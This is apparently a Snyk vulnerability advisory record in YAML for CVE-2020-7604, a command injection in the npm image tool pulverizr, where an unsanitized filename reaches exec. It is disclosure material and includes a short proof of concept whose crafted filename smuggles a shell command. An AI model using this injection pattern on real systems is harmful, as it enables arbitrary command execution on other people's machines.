---
- id: snykio:npm:pulverizr:560122
  title: Command Injection
  description: "[pulverizr][1] is a to smash your images down to size.\n\nAffected
    versions of this package are vulnerable to Command Injection.\nWithin `lib/job.js`,
    the variable `filename` can be controlled by the\nattacker. This function uses
    the variable `filename` to construct the\nargument of the exec call without any
    sanitization.\n\nIn order to successfully exploit this vulnerability, an attacker
    will\nneed to create a new file with the same name as the attack command.\n\n###
    PoC   {#poc}\n\n    var root = require(\"pulverizr\");\n    var fs = require(\"fs\");\n
    \   var attack_code = \"touch Song\";\n    \n    var injection_code = \"\\\"&\"
    + attack_code + \"&\\\"a.jpg\"\n    var inputs = [injection_code]\n    fs.writeFile(injection_code,
    \"123\", function(){});\n    \n    var job = root.createJob(inputs, {});\n    job.run();\n\n\n\n[1]:
    https://www.npmjs.com/package/pulverizr\n"
  affected_package: pulverizr
  vulnerable_versions:
  - "*"
  severity: medium
  package_manager: npm
  cve:
  - CVE-2020-7604
  cwe:
  - CWE-78
  disclosed_date: 2020-03-13
  created_date: 2020-03-13
  last_modified_date: 2020-03-13
  credit:
  - JHU System Security Lab
  references:
  - https://github.com/bentruyman/pulverizr/blob/master/lib/job.js#L73
  source_url: https://snyk.io/vuln/SNYK-JS-PULVERIZR-560122
